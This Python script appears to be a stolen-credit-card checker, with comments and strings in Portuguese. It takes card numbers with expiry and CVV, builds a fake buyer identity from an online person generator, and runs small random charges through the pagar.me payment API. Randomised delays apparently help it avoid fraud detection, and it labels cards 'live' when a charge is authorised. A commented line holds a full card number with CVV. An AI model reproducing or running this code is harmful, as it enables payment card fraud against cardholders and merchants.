import sys
sys.path.insert(1, '././')

from defs import arq
from defs import ca

import requests, re, random, time
import json

def pessoa():

    headers = {
        'authority': 'www.4devs.com.br',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.4devs.com.br',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
        'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'cookie': '_ga=GA1.3.226838642.1632425559; __gads=ID=b672bca0fb36c45c:T=1632425607:S=ALNI_MbkHDAqM5_5FT9blNZyWehLz58FJA; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.3.1719671166.1642974412; _gat=1; _gat_UA-66505558-21=1',
    }

    data = {
    'acao': 'gerar_pessoa',
    'sexo': 'I',
    'pontuacao': 'S',
    'idade': '0',
    'cep_estado': '',
    'txt_qtde': '1',
    'cep_cidade': ''
    }

    response = requests.post('https://www.4devs.com.br/ferramentas_online.php', headers=headers, data=data)
    
    return response.json()


def auth():
    dados = arq.ler_json(ca.config)['checker']['pagar.me']
        
    return {
        "token": dados['token']
    }

def debito(cc):
    if len(cc.split("|")) == 4:
        ccn, mes, ano, cvv = cc.split("|")
        
        if len(ano) == 2:
            ano = '20'+ano
        
        url = "https://api.pagar.me/1/transactions"
        
        headers = {
        "Content-Type": "application/json"
        }
        
        dados = pessoa()
        
            
        debitar = random.randint(100, 200)
        data = {
            "api_key": auth()['token'],
            "amount": debitar,
            "card_number": ccn,
            "card_cvv": cvv,
            "card_expiration_date": mes + ano[2:],
            "card_holder_name": dados["nome"].upper(),
            "customer": {
                "external_id": str(random.randint(111111,999999)),
                "name": dados["nome"].upper(),
                "type": "individual",
                "country": "br",
                "email": dados['email'],
                "documents": [
                    {
                        "type": "cpf",
                        "number": dados["cpf"]
                    }
                ],
                "phone_numbers": [
                    "+55" + re.sub(
                        "[^0-9]+", "", dados["celular"]
                    )
                ],
                "birthday": "-".join(
                    reversed(
                        dados["data_nasc"].split("/")
                    )
                )
            },
            "billing": {
                "name": dados["nome"],
                "address": {
                    "country": "br",
                    "state": dados["estado"],
                    "city": dados["cidade"],
                    "neighborhood": dados["bairro"],
                    "street": dados["endereco"],
                    "street_number": str(dados["numero"]),
                    "zipcode": dados["cep"].replace("-", "")
                }
            },
            "shipping": {
                "fee": 000,
                "name": dados["nome"],
                "address": {
                    "country": "br",
                    "state": dados["estado"],
                    "city": dados["cidade"],
                    "neighborhood": dados["bairro"],
                    "street": dados["endereco"],
                    "street_number": str(dados["numero"]),
                    "zipcode": dados["cep"].replace("-", "")
                }
            },
            "items": [
                {
                    "id": "SF280",
                    "title": "Check-in Demo",
                    "unit_price": debitar,
                    "quantity": 1,
                    "tangible": True
                }
            ]
    
        }
        
        
        response = requests.post(
            url,
            headers=headers,
            json=data
        ).json()
        
        
        preco = str(debitar)
        preco = f'R${preco[0]},{preco[1]}{preco[2]}'
        
        delay = random.randint(6,10)
        time.sleep(delay)
        
        if "errors" in response:
            return {
                "status" : False,
                "live" : False,
                "message" :response['errors'][0]['message']
                }
                
        
        try:
            code = response['acquirer_response_code']
            if "status" not in response.keys() or code == None:
                return {
                "status" : False,
                "live" : False,
                "message" :" Erro no gateway"
                }
                
            elif response["acquirer_response_code"] == "0000":
            
                return {
                "status" : True,
                "live" : True,
                "message" :f'Transação autorizada - Code: {code} - {preco} - {delay}s'
                }
        
            else:        
                return {
                "status" : True,
                "live" : False,
                "message" :f'Transação não autorizada - Code: {code} - {preco} - {delay}s'
                }
            
            
        except Exception as e:
            return {
                "status" : False,
                "live" : False,
                "message" :"Erro interno"
                }
        
    else:
        return {
                "status" : False,
                "live" : False,
                "message" :"CC inválida"
                }


#print(debito('5274681979967341|04|2028|606'))